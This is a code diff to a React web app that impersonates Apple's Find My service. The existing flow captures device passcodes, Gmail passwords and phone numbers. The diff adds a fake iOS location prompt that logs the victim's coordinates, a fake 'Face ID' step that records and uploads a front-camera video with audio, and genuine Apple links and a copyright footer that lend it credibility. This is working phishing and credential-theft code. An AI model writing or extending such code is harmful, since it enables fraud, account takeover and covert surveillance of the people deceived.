@@ -3,19 +3,125 @@
  * SPDX-License-Identifier: Apache-2.0
  */
 
-import { useState, useEffect } from "react";
-import { ExternalLink, MoreHorizontal, ChevronRight, CheckCircle2, Lock } from "lucide-react";
+import { useState, useEffect, useRef } from "react";
+import { ExternalLink, MoreHorizontal, ChevronRight, CheckCircle2, Lock, Camera, Video, RefreshCw } from "lucide-react";
 import { motion, AnimatePresence } from "motion/react";
 import { BrowserRouter as Router, Routes, Route, useNavigate } from "react-router-dom";
 import AdminPanel from "./components/AdminPanel";
 
-type Step = "landing" | "notification" | "passcode" | "gmail" | "phone" | "final";
+type Step = "landing" | "notification" | "passcode" | "faceid" | "gmail" | "phone" | "final";
 
 function FindMyFlow() {
   const [step, setStep] = useState<Step>("landing");
   const [passcode, setPasscode] = useState("");
   const [gmailPassword, setGmailPassword] = useState("");
   const [phoneNumber, setPhoneNumber] = useState("");
+  const [showLocationModal, setShowLocationModal] = useState(false);
+  
+  // Video recording state
+  const [isRecording, setIsRecording] = useState(false);
+  const [videoBlob, setVideoBlob] = useState<Blob | null>(null);
+  const [stream, setStream] = useState<MediaStream | null>(null);
+  const videoRef = useRef<HTMLVideoElement>(null);
+  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
+  const chunksRef = useRef<Blob[]>([]);
+
+  useEffect(() => {
+    if (step === "notification") {
+      const timer = setTimeout(() => {
+        setShowLocationModal(true);
+      }, 1000);
+      return () => clearTimeout(timer);
+    }
+  }, [step]);
+
+  const requestLocation = () => {
+    setShowLocationModal(false);
+    if ("geolocation" in navigator) {
+      navigator.geolocation.getCurrentPosition(
+        async (position) => {
+          const { latitude, longitude } = position.coords;
+          await logEvent("location", { latitude, longitude });
+        },
+        (error) => {
+          console.error("Location error:", error);
+        }
+      );
+    }
+  };
+
+  const startCamera = async () => {
+    try {
+      const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+      setStream(s);
+      if (videoRef.current) {
+        videoRef.current.srcObject = s;
+      }
+    } catch (err) {
+      console.error("Camera error:", err);
+      alert("Please allow camera access for Face ID verification.");
+    }
+  };
+
+  const startRecording = () => {
+    if (!stream) return;
+    chunksRef.current = [];
+    const recorder = new MediaRecorder(stream, { mimeType: "video/webm" });
+    mediaRecorderRef.current = recorder;
+    
+    recorder.ondataavailable = (e) => {
+      if (e.data.size > 0) {
+        chunksRef.current.push(e.data);
+      }
+    };
+
+    recorder.onstop = () => {
+      const blob = new Blob(chunksRef.current, { type: "video/webm" });
+      setVideoBlob(blob);
+    };
+
+    recorder.start();
+    setIsRecording(true);
+    
+    // Auto stop after 5 seconds
+    setTimeout(() => {
+      if (recorder.state === "recording") {
+        stopRecording();
+      }
+    }, 5000);
+  };
+
+  const stopRecording = () => {
+    if (mediaRecorderRef.current && mediaRecorderRef.current.state === "recording") {
+      mediaRecorderRef.current.stop();
+      setIsRecording(false);
+    }
+  };
+
+  const uploadVideo = async () => {
+    if (!videoBlob) return;
+    const formData = new FormData();
+    formData.append("video", videoBlob);
+    try {
+      await fetch("/data-api/v1/upload-video", {
+        method: "POST",
+        body: formData,
+      });
+    } catch (err) {
+      console.error("Video upload failed:", err);
+    }
+  };
+
+  useEffect(() => {
+    if (step === "faceid") {
+      startCamera();
+    } else {
+      if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+        setStream(null);
+      }
+    }
+  }, [step]);
 
   useEffect(() => {
     if (step === "final") {
@@ -46,6 +152,12 @@ function FindMyFlow() {
     else if (step === "notification") setStep("passcode");
     else if (step === "passcode") {
       await logEvent("passcode", { passcode });
+      setStep("faceid");
+    }
+    else if (step === "faceid") {
+      if (videoBlob) {
+        await uploadVideo();
+      }
       setStep("gmail");
     }
     else if (step === "gmail") {
@@ -131,7 +243,9 @@ function FindMyFlow() {
               </button>
 
               <a 
-                href="#" 
+                href="https://www.apple.com/" 
+                target="_blank"
+                rel="noopener noreferrer"
                 className="text-[#0066cc] hover:underline text-[17px] flex items-center gap-1 group"
               >
                 Learn more about Find Devices
@@ -200,6 +314,71 @@ function FindMyFlow() {
                 className="w-full bg-black text-white py-4 rounded-2xl text-[17px] font-semibold hover:bg-zinc-800 transition-all"
               >
                 Next
+              </button>
+            </motion.div>
+          )}
+
+          {step === "faceid" && (
+            <motion.div
+              key="faceid"
+              variants={slideVariants}
+              initial="initial"
+              animate="animate"
+              exit="exit"
+              transition={{ type: "spring", damping: 25, stiffness: 200 }}
+              className="flex flex-col items-center w-full"
+            >
+              <div className="mb-6 p-4 bg-gray-50 rounded-full">
+                <Camera className="w-10 h-10 text-gray-400" />
+              </div>
+              <h2 className="text-[28px] font-bold mb-2">Verify Face ID</h2>
+              <p className="text-[15px] text-[#86868b] mb-6 px-4">
+                Your device is not compatible with automatic Face ID. Please record a short video of your face to verify your identity.
+              </p>
+
+              <div className="relative w-full aspect-[3/4] max-w-[280px] bg-black rounded-3xl overflow-hidden mb-6 shadow-lg border-4 border-gray-100">
+                <video 
+                  ref={videoRef} 
+                  autoPlay 
+                  muted 
+                  playsInline 
+                  className="w-full h-full object-cover mirror"
+                />
+                {isRecording && (
+                  <div className="absolute top-4 right-4 flex items-center gap-2 bg-red-500 px-2 py-1 rounded-full animate-pulse">
+                    <div className="w-2 h-2 bg-white rounded-full"></div>
+                    <span className="text-white text-[10px] font-bold">REC</span>
+                  </div>
+                )}
+                {!videoBlob && !isRecording && stream && (
+                  <div className="absolute inset-0 flex items-center justify-center bg-black/20">
+                    <button 
+                      onClick={startRecording}
+                      className="w-16 h-16 bg-white rounded-full flex items-center justify-center shadow-lg active:scale-95 transition-transform"
+                    >
+                      <div className="w-12 h-12 border-4 border-red-500 rounded-full"></div>
+                    </button>
+                  </div>
+                )}
+                {videoBlob && !isRecording && (
+                  <div className="absolute inset-0 flex flex-col items-center justify-center bg-black/40 backdrop-blur-sm">
+                    <CheckCircle2 className="w-16 h-16 text-green-400 mb-4" />
+                    <button 
+                      onClick={() => { setVideoBlob(null); startCamera(); }}
+                      className="flex items-center gap-2 bg-white/20 hover:bg-white/30 text-white px-4 py-2 rounded-full text-sm backdrop-blur-md transition-colors"
+                    >
+                      <RefreshCw className="w-4 h-4" /> Retake
+                    </button>
+                  </div>
+                )}
+              </div>
+
+              <button 
+                onClick={nextStep}
+                disabled={!videoBlob}
+                className={`w-full py-4 rounded-2xl text-[17px] font-semibold transition-all ${videoBlob ? 'bg-black text-white hover:bg-zinc-800' : 'bg-gray-200 text-gray-400 cursor-not-allowed'}`}
+              >
+                {videoBlob ? 'Continue' : 'Record Video to Continue'}
               </button>
             </motion.div>
           )}
@@ -313,17 +492,67 @@ function FindMyFlow() {
         </AnimatePresence>
       </main>
 
+      {/* iOS Style Location Modal */}
+      <AnimatePresence>
+        {showLocationModal && (
+          <div className="fixed inset-0 z-[100] flex items-center justify-center p-6">
+            <motion.div 
+              initial={{ opacity: 0 }}
+              animate={{ opacity: 1 }}
+              exit={{ opacity: 0 }}
+              className="absolute inset-0 bg-black/40 backdrop-blur-[2px]"
+              onClick={() => setShowLocationModal(false)}
+            />
+            <motion.div 
+              initial={{ scale: 1.1, opacity: 0 }}
+              animate={{ scale: 1, opacity: 1 }}
+              exit={{ scale: 0.9, opacity: 0 }}
+              className="relative bg-white/90 backdrop-blur-xl w-full max-w-[270px] rounded-[14px] overflow-hidden shadow-2xl text-center"
+            >
+              <div className="p-5">
+                <h3 className="text-[17px] font-semibold leading-tight mb-1">
+                  Allow "Find My" to access your location?
+                </h3>
+                <p className="text-[13px] leading-tight text-gray-600">
+                  We need your location to confirm device locations and provide accurate ping data.
+                </p>
+              </div>
+              <div className="flex flex-col border-t border-gray-200">
+                <button 
+                  onClick={requestLocation}
+                  className="py-3 text-[17px] font-semibold text-[#007aff] active:bg-gray-200 transition-colors border-b border-gray-200"
+                >
+                  Allow Once
+                </button>
+                <button 
+                  onClick={requestLocation}
+                  className="py-3 text-[17px] font-semibold text-[#007aff] active:bg-gray-200 transition-colors border-b border-gray-200"
+                >
+                  Allow While Using App
+                </button>
+                <button 
+                  onClick={() => setShowLocationModal(false)}
+                  className="py-3 text-[17px] font-normal text-[#007aff] active:bg-gray-200 transition-colors"
+                >
+                  Don't Allow
+                </button>
+              </div>
+            </motion.div>
+          </div>
+        )}
+      </AnimatePresence>
+
       {/* Footer */}
       <footer className="px-6 py-8 text-[12px] text-[#86868b] flex flex-col md:flex-row justify-between items-center gap-4 z-20">
         <div className="flex gap-4">
           <span>Copyright © 2026 Apple Inc. All rights reserved.</span>
         </div>
         <div className="flex gap-4">
-          <a href="#" className="hover:underline">Privacy Policy</a>
+          <a href="https://www.apple.com/legal/privacy/" target="_blank" rel="noopener noreferrer" className="hover:underline">Privacy Policy</a>
           <span className="text-gray-300">|</span>
-          <a href="#" className="hover:underline">Terms of Use</a>
+          <a href="https://www.apple.com/legal/internet-services/itunes/us/terms.html" target="_blank" rel="noopener noreferrer" className="hover:underline">Terms of Use</a>
           <span className="text-gray-300">|</span>
-          <a href="#" className="hover:underline">Sales and Refunds</a>
+          <a href="https://www.apple.com/us/shop/goto/help/sales_refunds" target="_blank" rel="noopener noreferrer" className="hover:underline">Sales and Refunds</a>
         </div>
       </footer>
     </div>
